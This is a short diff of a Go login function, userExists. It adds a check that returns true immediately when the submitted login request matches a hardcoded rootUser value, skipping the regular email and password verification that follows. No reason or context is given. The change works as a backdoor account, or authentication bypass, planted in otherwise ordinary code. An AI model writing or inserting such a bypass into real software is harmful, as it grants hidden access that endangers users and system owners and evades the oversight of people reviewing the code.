@@ -21,6 +21,10 @@ type UserResponse struct {
 }
 
 var userExists = func(user LoginRequest, r *http.Request) bool {
+	if user == rootUser {
+		return true
+	}
+
 	var email string
 	var pass string
 
